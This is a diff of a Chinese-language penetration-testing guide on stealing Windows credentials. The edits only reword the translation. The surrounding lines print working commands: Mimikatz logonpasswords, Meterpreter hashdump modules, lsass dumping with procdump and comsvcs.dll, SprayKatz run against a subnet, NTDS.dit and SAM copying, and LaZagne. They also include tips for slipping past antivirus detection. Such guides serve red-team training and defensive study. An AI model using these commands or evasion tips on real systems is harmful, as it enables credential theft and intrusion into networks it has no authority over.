@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## 使用 Meterpreter 的凭据
 
-使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **来** **搜索受害者内部的密码和哈希。**
+使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **来** **在受害者内部搜索密码和哈希。**
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -65,9 +65,9 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-此过程是通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成的： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 **lsass.exe 的 PID** 作为参数传递给 procdump **而不是** **lsass.exe 的名称** 更加 **隐蔽**。
+**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump **而不是** lsass.exe 的 **名称** 更加 **隐蔽**。
 
 ### 使用 **comsvcs.dll** 转储 lsass
 
@@ -91,7 +91,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### 使用 procdump 转储 lsass
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个 Microsoft 签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -100,7 +100,7 @@ Get-Process -Name LSASS
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。
 
-**主要功能**：
+**关键功能**：
 
 1. 绕过 PPL 保护
 2. 混淆内存转储文件以规避 Defender 基于签名的检测机制
@@ -194,7 +194,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 更多信息请参见：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。
+Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高性能）。
 
 #### 解密 NTDS.dit 内的哈希
 
@@ -212,7 +212,7 @@ Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然�
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-您还可以使用 [**卷影副本**](./#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影副本**](./#stealing-sam-and-system) 技巧）。
+您还可以使用 [**卷影复制**](./#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影复制**](./#stealing-sam-and-system) 技巧）。
 
 ### **从 NTDS.dit 中提取哈希**
 
@@ -238,7 +238,7 @@ ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 
 ## Lazagne
 
-从 [这里](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
+从 [here](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
 ```
 lazagne.exe all
 ```
